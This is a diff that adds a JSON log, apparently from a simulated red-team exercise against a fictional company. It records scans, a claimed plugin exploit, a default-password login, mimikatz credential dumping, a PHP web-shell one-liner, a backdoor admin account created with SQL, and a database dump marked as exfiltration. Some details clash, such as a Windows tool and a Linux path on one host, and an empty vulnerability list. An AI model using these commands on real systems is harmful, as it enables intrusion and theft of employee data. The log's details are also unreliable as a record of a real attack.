@@ -1,0 +1,223 @@
+{
+  "round_id": 3,
+  "timestamp": "2025-08-11T21:39:41.873843",
+  "total_actions": 15,
+  "successful_actions": 14,
+  "compromised_assets": [
+    "Corporate Website",
+    "HR Portal"
+  ],
+  "persistence_mechanisms": [
+    "web_shell",
+    "backdoor_account",
+    "web_shell",
+    "backdoor_account"
+  ],
+  "discovered_vulnerabilities": [],
+  "current_access_level": "internal",
+  "actions": [
+    {
+      "timestamp": "2025-08-11T21:39:36.872800",
+      "phase": "recon",
+      "technique": "T1590.001 - IP Addresses",
+      "target": "meridiandynamics.com",
+      "payload": "nslookup meridiandynamics.com",
+      "result": "Discovered IP: 203.0.113.50",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "ip_meridiandynamics.com.txt"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:36.872817",
+      "phase": "recon",
+      "technique": "T1590.001 - IP Addresses",
+      "target": "md-consulting.net",
+      "payload": "nslookup md-consulting.net",
+      "result": "Discovered IP: 203.0.113.50",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "ip_md-consulting.net.txt"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:36.872849",
+      "phase": "recon",
+      "technique": "T1590.002 - Network Trust Dependencies",
+      "target": "203.0.113.50",
+      "payload": "nmap -sS -O -A 203.0.113.50",
+      "result": "Open ports: 80/tcp, 443/tcp, 25/tcp, 587/tcp, 993/tcp",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "nmap_scan.xml",
+        "open_ports.txt"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:36.872855",
+      "phase": "recon",
+      "technique": "T1590.005 - Network Topology",
+      "target": "https://meridiandynamics.com",
+      "payload": "curl -I https://meridiandynamics.com",
+      "result": "Discovered WordPress v5.8.2",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "headers_corporate_website.txt"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:36.872862",
+      "phase": "recon",
+      "technique": "T1590.005 - Network Topology",
+      "target": "https://portal.meridiandynamics.com",
+      "payload": "curl -I https://portal.meridiandynamics.com",
+      "result": "Discovered React SPA v1.8.3",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "headers_customer_portal.txt"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:36.872867",
+      "phase": "recon",
+      "technique": "T1590.005 - Network Topology",
+      "target": "https://api.meridiandynamics.com/files",
+      "payload": "curl -I https://api.meridiandynamics.com/files",
+      "result": "Discovered REST API v2.0.1",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "headers_file_storage_api.txt"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:36.872874",
+      "phase": "recon",
+      "technique": "T1595.003 - Wordlist Scanning",
+      "target": "https://meridiandynamics.com",
+      "payload": "dirb https://meridiandynamics.com /usr/share/dirb/wordlists/common.txt",
+      "result": "Discovered: /wp-admin/, /wp-content/plugins/, /xmlrpc.php",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "dirb_results.txt"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:37.873018",
+      "phase": "initial_access",
+      "technique": "T1190 - Exploit Public-Facing Application",
+      "target": "https://meridiandynamics.com",
+      "payload": "POST /wp-content/plugins/contact-form-7/includes/rest-api.php",
+      "result": "Remote code execution achieved via CVE-2023-6000",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "webshell.php",
+        "access_log.txt"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:38.873230",
+      "phase": "credential_access",
+      "technique": "T1078.001 - Default Accounts",
+      "target": "https://hr.meridiandynamics.com",
+      "payload": "POST /login username=admin&password=password123",
+      "result": "Successfully logged in with default admin credentials",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "hr_session_cookie.txt",
+        "admin_panel_access.html"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:38.873298",
+      "phase": "credential_access",
+      "technique": "T1003.001 - LSASS Memory",
+      "target": "192.168.1.10",
+      "payload": "mimikatz.exe sekurlsa::logonpasswords",
+      "result": "Extracted 3 sets of credentials from memory",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "mimikatz_output.txt",
+        "extracted_creds.txt"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:39.873425",
+      "phase": "lateral_movement",
+      "technique": "T1021.001 - Remote Desktop Protocol",
+      "target": "10.0.50.10",
+      "payload": "rdesktop -u admin -p password123 10.0.50.10",
+      "result": "Failed - RDP disabled on finance systems",
+      "success": false,
+      "detected": false,
+      "artifacts": []
+    },
+    {
+      "timestamp": "2025-08-11T21:39:39.873452",
+      "phase": "lateral_movement",
+      "technique": "T1046 - Network Service Scanning",
+      "target": "10.0.0.0/16",
+      "payload": "nmap -sS 10.0.0.0/16",
+      "result": "Discovered active hosts in engineering and finance VLANs",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "internal_scan_results.xml"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:40.873615",
+      "phase": "persistence",
+      "technique": "T1505.003 - Web Shell",
+      "target": "192.168.1.10",
+      "payload": "echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/wp-content/themes/twentytwentyone/shell.php",
+      "result": "Web shell installed for persistent access",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "webshell_location.txt"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:40.873668",
+      "phase": "persistence",
+      "technique": "T1136.001 - Local Account",
+      "target": "HR Portal Database",
+      "payload": "INSERT INTO users (username, password, role) VALUES ('backup_svc', 'B@ckup2024!', 'admin')",
+      "result": "Backdoor admin account created",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "backdoor_account.txt"
+      ]
+    },
+    {
+      "timestamp": "2025-08-11T21:39:41.873803",
+      "phase": "exfiltration",
+      "technique": "T1041 - Exfiltration Over C2 Channel",
+      "target": "HR Database",
+      "payload": "SELECT * FROM employees; mysqldump --all-databases",
+      "result": "Exfiltrated employee records for all 50 employees",
+      "success": true,
+      "detected": false,
+      "artifacts": [
+        "employee_dump.sql",
+        "hr_records.csv"
+      ]
+    }
+  ],
+  "impact_assessment": {
+    "confidentiality": "medium",
+    "integrity": "medium",
+    "availability": "low"
+  }
+}
